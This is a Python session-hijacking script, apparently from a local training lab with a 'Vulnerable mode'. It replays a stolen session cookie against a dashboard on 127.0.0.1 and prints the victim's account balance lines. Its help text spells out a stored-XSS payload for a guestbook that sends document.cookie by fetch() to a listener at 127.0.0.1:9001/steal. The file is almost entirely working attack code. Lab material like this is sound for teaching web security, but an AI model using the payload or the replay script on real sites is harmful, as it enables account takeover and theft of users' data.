import requests
import time

TARGET_URL = "http://127.0.0.1:5000/dashboard"

# After stealing a cookie via XSS, paste its value here.
STOLEN_SESSION_COOKIE = "REPLACE_ME_WITH_STOLEN_COOKIE_STRING"

def hijack():
    print("="*50)
    print("      SESSION HIJACKING (XSS THEFT) SCRIPT      ")
    print("="*50)
    
    if STOLEN_SESSION_COOKIE == "REPLACE_ME_WITH_STOLEN_COOKIE_STRING":
        print("[-] Error: You need to paste the stolen cookie string into this script first!")
        print("    1. Drop <script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script> into the guestbook.")
        print("    2. Start listener.py.")
        print("    3. Wait for the victim to view the guestbook and copy the cookie it prints.")
        return

    print(f"\n[+] Attempting to access {TARGET_URL}")
    print(f"[+] Injecting stolen cookie: {STOLEN_SESSION_COOKIE[:20]}...\n")
    
    # We create a brand new HTTP session with no prior credentials
    s = requests.Session()
    s.cookies.set("session", STOLEN_SESSION_COOKIE, domain="127.0.0.1")
    
    # Attempt to hit the authenticated dashboard
    response = s.get(TARGET_URL)
    
    if "Welcome," in response.text:
        print("[+] SUCCESS! Session Hijacked.")
        print("[+] We accessed the dashboard without knowing the victim's password!\n")
        
        # Print a snippet of the dashboard data
        print("--- EXTRACTED DASHBOARD CONTENT ---")
        for line in response.text.split('\n'):
            if "Account Balance" in line or "Welcome," in line or "Available Funds" in line:
                print("    " + line.strip())
        print("-----------------------------------")
    else:
        print("[-] Failed to access dashboard. Is the session valid and Vulnerable mode enabled?")

if __name__ == '__main__':
    hijack()
